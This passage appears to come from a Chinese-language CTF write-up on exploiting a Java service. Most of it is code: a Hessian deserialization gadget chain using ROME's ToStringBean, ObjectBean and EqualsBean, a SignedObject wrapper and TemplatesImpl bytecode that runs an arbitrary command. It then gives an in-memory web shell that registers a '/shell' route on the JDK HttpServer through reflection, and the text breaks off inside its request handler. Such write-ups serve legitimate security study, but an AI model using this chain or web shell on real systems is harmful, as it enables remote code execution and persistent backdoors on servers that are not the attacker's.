+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.caucho.hessian.io.Hessian2Input</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.caucho.hessian.io.Hessian2Output</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.EqualsBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.ObjectBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.ToStringBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">javassist.ClassPool</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">javassist.CtClass</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">javassist.CtConstructor</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.*</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Field</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.security.*</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.Base64</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.HashMap</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">javax.xml.transform.Templates</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">exp</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//为类的属性设置值
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">setValue</span><span style="color:#666">(</span>Object target<span style="color:#666">,</span> String name<span style="color:#666">,</span> Object value<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#666">=</span> target<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span>name<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>target<span style="color:#666">,</span>value<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//生成恶意的bytecodes
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]</span> <span style="color:#00a000">getTemplatesImpl</span><span style="color:#666">(</span>String cmd<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">try</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            ClassPool pool <span style="color:#666">=</span> ClassPool<span style="color:#666">.</span><span style="color:#b44">getDefault</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            CtClass ctClass <span style="color:#666">=</span> pool<span style="color:#666">.</span><span style="color:#b44">makeClass</span><span style="color:#666">(</span><span style="color:#b44">&#34;snakin&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            CtClass superClass <span style="color:#666">=</span> pool<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            ctClass<span style="color:#666">.</span><span style="color:#b44">setSuperclass</span><span style="color:#666">(</span>superClass<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            CtConstructor constructor <span style="color:#666">=</span> ctClass<span style="color:#666">.</span><span style="color:#b44">makeClassInitializer</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            constructor<span style="color:#666">.</span><span style="color:#b44">setBody</span><span style="color:#666">(</span><span style="color:#b44">&#34;  Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#666">+</span> cmd <span style="color:#666">+</span> <span style="color:#b44">&#34;\&#34;);&#34;</span> <span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]</span> bytes <span style="color:#666">=</span> ctClass<span style="color:#666">.</span><span style="color:#b44">toBytecode</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            ctClass<span style="color:#666">.</span><span style="color:#b44">defrost</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> bytes<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception e<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#666">.</span><span style="color:#b44">printStackTrace</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">new</span> <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]{};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> HashMap <span style="color:#00a000">getObject</span><span style="color:#666">()</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//因为在TemplatesImp类中的构造函数中，_bytecodes为二维数组
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]</span> code <span style="color:#666">=</span> getTemplatesImpl<span style="color:#666">(</span><span style="color:#b44">&#34;calc&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[][]</span> bytecodes <span style="color:#666">=</span> <span style="color:#666">{</span>code<span style="color:#666">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//创建TemplatesImpl类
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        TemplatesImpl templates <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> TemplatesImpl<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span><span style="color:#b44">&#34;_name&#34;</span><span style="color:#666">,</span> <span style="color:#b44">&#34;aaa&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span> <span style="color:#b44">&#34;_bytecodes&#34;</span><span style="color:#666">,</span> bytecodes<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span><span style="color:#b44">&#34;_tfactory&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">new</span> TransformerFactoryImpl<span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造ToStringBean
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ToStringBean toStringBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>Templates<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>templates<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean1<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>String<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span><span style="color:#b44">&#34;s&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造ObjectBean
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ObjectBean objectBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ObjectBean<span style="color:#666">(</span>ToStringBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>toStringBean1<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造HashMap
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        HashMap hashMap<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        hashMap<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>objectBean<span style="color:#666">,</span><span style="color:#b44">&#34;snakin&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//反射修改字段
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        Field obj<span style="color:#666">=</span>EqualsBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;obj&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Field equalsBean<span style="color:#666">=</span>ObjectBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;equalsBean&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        equalsBean<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>equalsBean<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>objectBean<span style="color:#666">),</span>toStringBean<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span>  hashMap<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        HashMap evilhashMap<span style="color:#666">=</span>getObject<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        KeyPairGenerator keyPairGenerator<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        keyPairGenerator <span style="color:#666">=</span> KeyPairGenerator<span style="color:#666">.</span><span style="color:#b44">getInstance</span><span style="color:#666">(</span><span style="color:#b44">&#34;DSA&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        keyPairGenerator<span style="color:#666">.</span><span style="color:#b44">initialize</span><span style="color:#666">(</span>1024<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        KeyPair keyPair <span style="color:#666">=</span> keyPairGenerator<span style="color:#666">.</span><span style="color:#b44">genKeyPair</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        PrivateKey privateKey <span style="color:#666">=</span> keyPair<span style="color:#666">.</span><span style="color:#b44">getPrivate</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        Signature signingEngine <span style="color:#666">=</span> Signature<span style="color:#666">.</span><span style="color:#b44">getInstance</span><span style="color:#666">(</span><span style="color:#b44">&#34;DSA&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        SignedObject signedObject <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SignedObject<span style="color:#666">(</span>evilhashMap<span style="color:#666">,</span>privateKey<span style="color:#666">,</span>signingEngine<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>SignedObject<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>signedObject<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean1<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>String<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span><span style="color:#b44">&#34;s&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectBean objectBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ObjectBean<span style="color:#666">(</span>ToStringBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>toStringBean1<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap hashMap<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        hashMap<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>objectBean<span style="color:#666">,</span><span style="color:#b44">&#34;snakin&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Field obj<span style="color:#666">=</span> EqualsBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;obj&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Field equalsBean<span style="color:#666">=</span>ObjectBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;equalsBean&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        equalsBean<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>equalsBean<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>objectBean<span style="color:#666">),</span>toStringBean<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ByteArrayOutputStream<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        Hessian2Output hessian2Output <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Hessian2Output<span style="color:#666">(</span>byteArrayOutputStream<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        hessian2Output<span style="color:#666">.</span><span style="color:#b44">writeObject</span><span style="color:#666">(</span>hashMap<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        hessian2Output<span style="color:#666">.</span><span style="color:#b44">flushBuffer</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream byteArrayInputStream <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ByteArrayInputStream<span style="color:#666">(</span>bytes<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Hessian2Input hessian2Input <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Hessian2Input<span style="color:#666">(</span>byteArrayInputStream<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        hessian2Input<span style="color:#666">.</span><span style="color:#b44">readObject</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#666">}</span>
+</span></span></code></pre></div><p>具体步骤注释中写了，此时我们已经可以利用<code>TemplatesImpl</code>加载字节码，接下来的问题是如何解决不出网</p>
+<h3 id="内存马">内存马</h3>
+<p>显然，为了获得回显，我们需要尝试构造内存马，正常基于tomcat和spring的内存马都是通过上下文来获取request对象，本题目直接使用http handler搭建服务，我们该如何实现动态注册呢？</p>
+<blockquote>
+<p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取。</p>
+</blockquote>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230131120356328.png" alt="image-20230131120356328"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Thread.currentThread()--&gt;group--&gt;threads[1]--&gt;target--&gt;this$0--&gt;contexts--&gt;list[0]--&gt;handler
+</span></span></code></pre></div><p>接下来就是构造内存马,我们新建一个路由</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.net.httpserver.HttpExchange</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.net.httpserver.HttpHandler</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.ByteArrayOutputStream</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.IOException</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.InputStream</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.OutputStream</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Field</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Method</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">memoryshell</span> <span style="color:#a2f;font-weight:bold">extends</span> AbstractTranslet <span style="color:#a2f;font-weight:bold">implements</span> HttpHandler <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//获取当前线程
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        Object o <span style="color:#666">=</span> Thread<span style="color:#666">.</span><span style="color:#b44">currentThread</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">try</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            Field groupField <span style="color:#666">=</span> o<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;group&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            groupField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            Object group <span style="color:#666">=</span> groupField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>o<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Field threadsField <span style="color:#666">=</span> group<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;threads&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            threadsField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            Object t <span style="color:#666">=</span> threadsField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>group<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Thread<span style="color:#666">[]</span> threads <span style="color:#666">=</span> <span style="color:#666">(</span>Thread<span style="color:#666">[])</span> t<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">for</span> <span style="color:#666">(</span>Thread thread <span style="color:#666">:</span> threads<span style="color:#666">){</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">if</span><span style="color:#666">(</span>thread<span style="color:#666">.</span><span style="color:#b44">getName</span><span style="color:#666">().</span><span style="color:#b44">equals</span><span style="color:#666">(</span><span style="color:#b44">&#34;Thread-2&#34;</span><span style="color:#666">)){</span>
+</span></span><span style="display:flex;"><span>                    Field targetField <span style="color:#666">=</span> thread<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;target&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    targetField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object target <span style="color:#666">=</span> targetField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>thread<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Field thisField <span style="color:#666">=</span> target<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;this$0&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    thisField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object <span style="color:#a2f;font-weight:bold">this</span>$0 <span style="color:#666">=</span> thisField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>target<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Method createContext <span style="color:#666">=</span> Class<span style="color:#666">.</span><span style="color:#b44">forName</span><span style="color:#666">(</span><span style="color:#b44">&#34;sun.net.httpserver.ServerImpl&#34;</span><span style="color:#666">).</span><span style="color:#b44">getDeclaredMethod</span><span style="color:#666">(</span><span style="color:#b44">&#34;createContext&#34;</span><span style="color:#666">,</span> String<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span> HttpHandler<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    createContext<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    createContext<span style="color:#666">.</span><span style="color:#b44">invoke</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">this</span>$0<span style="color:#666">,</span><span style="color:#b44">&#34;/shell&#34;</span><span style="color:#666">,</span><span style="color:#a2f;font-weight:bold">new</span> memoryshell<span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception e<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#666">.</span><span style="color:#b44">printStackTrace</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">handle</span><span style="color:#666">(</span>HttpExchange t<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> IOException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        String response <span style="color:#666">=</span> <span style="color:#b44">&#34;MemoryShell&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        String query <span style="color:#666">=</span> t<span style="color:#666">.</span><span style="color:#b44">getRequestURI</span><span style="color:#666">().</span><span style="color:#b44">getQuery</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#666">[]</span> var3 <span style="color:#666">=</span> query<span style="color:#666">.</span><span style="color:#b44">split</span><span style="color:#666">(</span><span style="color:#b44">&#34;=&#34;</span><span style="color:#666">);</span>
